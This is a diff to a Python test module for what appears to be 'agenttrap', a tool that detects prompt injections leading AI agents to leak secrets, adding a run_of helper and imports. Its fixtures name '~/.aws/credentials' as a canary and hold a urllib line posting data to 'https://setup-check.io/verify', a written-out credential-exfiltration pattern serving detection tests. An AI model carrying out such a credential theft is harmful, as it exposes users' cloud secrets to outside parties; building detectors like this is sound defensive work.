@@ -2,11 +2,12 @@
 
 from datetime import date
 
-from agenttrap.agent import Injection
+from agenttrap.agent import Injection, Trace
 from agenttrap.detector import Flag, Leak, Request, judge
+from agenttrap.egress import Observed
 from agenttrap.intel import HostIntel, Report
 from agenttrap.localizer import Culprit
-from agenttrap.scan import FoundInjection, ScanResult
+from agenttrap.scan import FoundInjection, RunResult, ScanResult
 
 CANARY = "~/.aws/credentials"
 DESTINATION = "https://setup-check.io/verify"
@@ -16,6 +17,10 @@ SEND = 'urllib.request.urlopen("https://setup-check.io/verify", data=data, timeo
 
 def leak(canary: str = CANARY) -> Leak:
     return Leak(canary, DESTINATION, Request("POST", DESTINATION, body="secret"))
+
+
+def run_of(task: str, *leaks: Leak) -> RunResult:
+    return RunResult(task, Trace(task=task), Observed((), ()), tuple(leaks))
 
 
 def culprit(line: int, text: str) -> Culprit:
